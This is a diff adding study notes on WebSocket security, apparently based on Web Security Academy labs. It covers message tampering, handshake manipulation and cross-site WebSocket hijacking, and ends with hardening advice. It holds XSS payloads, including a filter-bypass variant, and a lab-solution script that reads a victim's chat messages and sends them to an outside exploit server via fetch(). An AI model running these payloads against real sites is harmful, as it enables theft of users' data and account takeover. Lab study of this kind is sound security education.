@@ -57,3 +57,96 @@ For example, a chat-bot application using WebSockets might send a message like t
 `{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}`
 
 ## Manipulating WebSocket traffic
+
+The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.
+
+For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
+`{"message":"Hello Carlos"}`
+
+The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:
+`<td>Hello Carlos</td>`
+
+In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:
+`{"message":"<img src=1 onerror='alert(1)'>"}`
+
+### Lab: Manipulating WebSocket messages to exploit vulnerabilities
+
+To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser. 
+
+
+
+Edit the intercepted message to contain the following payload:
+`<img src=1 onerror='alert(1)'>`
+
+## Manipulating the WebSocket handshake to exploit vulnerabilities
+
+Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:
+
+-    Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
+-    Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
+-    Attack surface introduced by custom HTTP headers used by the application.
+
+### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
+
+It has an aggressive but flawed XSS filter.
+
+To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 
+
+Payload: ``<img src=1 oNeRrOr=alert`1`>``
+
+## Using cross-site WebSockets to exploit vulnerabilities
+
+
+### Cross-site WebSocket hijacking?
+
+Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.
+
+An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.
+
+The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.
+
+For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
+```
+GET /chat HTTP/1.1
+Host: normal-website.com
+Sec-WebSocket-Version: 13
+Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
+Connection: keep-alive, Upgrade
+Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
+Upgrade: websocket
+```
+ll
+>The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
+### Lab: Cross-site WebSocket hijacking
+
+To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account. 
+
+Payload:
+```html
+<script>
+    var ws = new WebSocket(
+    "wss://0a8b00bf040fb76b82d8152000790054.web-security-academy.net/chat"
+  );
+  
+  ws.onopen = function () {
+    ws.send("READY");
+  };
+  
+  ws.onmessage = function (event) {
+    fetch(
+      "https://exploit-0a050000047fb76182bb14d501740069.exploit-server.net/exploit?message=" +
+        btoa(event.data)
+    );
+  };
+</script>
+```
+## 
+How to secure a WebSocket connection
+
+To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:
+
+-   Use the wss:// protocol (WebSockets over TLS).
+-    Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
+-    Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
+-    Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.
+
